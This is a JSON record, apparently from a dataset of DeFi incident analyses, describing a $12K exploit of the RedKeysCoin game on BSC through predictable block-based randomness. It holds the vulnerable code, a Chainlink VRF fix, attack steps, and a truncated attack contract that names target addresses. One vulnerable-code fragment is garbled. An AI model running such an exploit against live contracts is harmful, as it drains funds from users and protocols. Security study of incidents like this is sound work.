@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-05-XX_RedKeysCoin_PredictableRNG",
+ "source_file": "2024/2024-05-XX_RedKeysCoin_PredictableRNG.md",
+ "title": "RedKeysCoin — playGame Predictable Random Number Generation Analysis",
+ "date": "2024-05-01",
+ "protocol": "Red Keys Game",
+ "chain": "BSC",
+ "loss_raw": "~$12,000",
+ "loss_usd": 12000.0,
+ "root_cause": "The `playGame(uint16 choice, uint16 ratio, uint256 amount)` function uses predictable on-chain values — `block.timestamp`, block data, and the game `counter` — as randomness to determine outcomes, allowing the attacker to pre-compute results and win 50 consecutive times",
+ "attack_tx": null,
+ "vulnerable_contract": "0x71e3056aa",
+ "classes": [
+  "weak-randomness"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: randomness generated from predictable block data\ncontract RedKeysGame {\n    uint256 public counter;\n\n    function playGame(uint16 choice, uint16 ratio, uint256 amount) external {\n        counter++;\n        // Predictable RNG: uses block.timestamp, block.number, counter\n        uint256 random = uint256(keccak256(abi.encodePacked(\n            block.timestamp,\n            block.number,\n            counter,\n            msg.sender\n        ))) % 100;\n\n        if (random < winThreshold(ratio)) {\n            // choice validation — attacker always wins with pre-computed choice\n            REDKEYS.transfer(msg.sender, amount * ratio / 100);\n        }\n    }\n}\n\n//",
+  "// File: RedKeysCoin_decompiled.sol\ncontract RedKeysCoin {\n    function counter() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: using Chainlink VRF\nimport \"@chainlink/contracts/src/v0.8/VRFConsumerBase.sol\";\n\ncontract SecureGame is VRFConsumerBase {\n    function requestGame(uint256 amount) external returns (bytes32 requestId) {\n        requestId = requestRandomness(keyHash, fee);\n        pendingGames[requestId] = GameData(msg.sender, amount);\n    }\n\n    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {\n        // Game processed with Chainlink VRF result — not predictable in advance\n        GameData memory game = pendingGames[requestId];\n        uint256 result = randomness % 100;\n        // ...\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Loop 50 iterations:",
+  "→ [2] Query game.counter()",
+  "→ [3] Recompute RNG locally",
+  "→ [4] Call playGame(winningChoice, ratio, amount)",
+  "Same block, same parameters → always wins",
+  "→ [5] 50 iterations × profit = ~$12K drained"
+ ],
+ "other_code": [
+  "Attacker Contract\n  │\n  ├─→ [1] Loop 50 iterations:\n  │\n  ├─→ [2] Query game.counter()\n  │         └─ currentCounter = counter + 1 (predict next value)\n  │\n  ├─→ [3] Recompute RNG locally\n  │         └─ random = keccak256(block.timestamp, block.number, currentCounter, attacker) % 100\n  │         └─ Determine winning choice from this result\n  │\n  ├─→ [4] Call playGame(winningChoice, ratio, amount)\n  │         └─ Same block, same parameters → always wins\n  │\n  └─→ [5] 50 iterations × profit = ~$12K drained",
+  "interface IRedKeysGame {\n    function counter() external view returns (uint256);\n    function playGame(uint16 choice, uint16 ratio, uint256 amount) external;\n}\n\ncontract AttackContract {\n    IRedKeysGame constant game = IRedKeysGame(0x71e3056aa4985de9f5441f079e6c74454a3c95f0);\n    IERC20 constant REDKEYS    = IERC20(0x00e62b6CCf1fe3e5E01CE07F6232d7F378518b6b);\n\n    function testExploit() external {\n        uint256 betAmount = 100e18;\n\n        for (uint i = 0; i < 50; i++) {\n            // [1] Predict next counter value\n            uint256 nextCounter = game.counter() + 1;\n\n            // [2] Pre-compute result using the same RNG logic as the game\n            uint256 random = uint256(keccak256(abi.encodePacked(\n                block.timestamp,\n                block.number,\n                n"
+ ]
+}
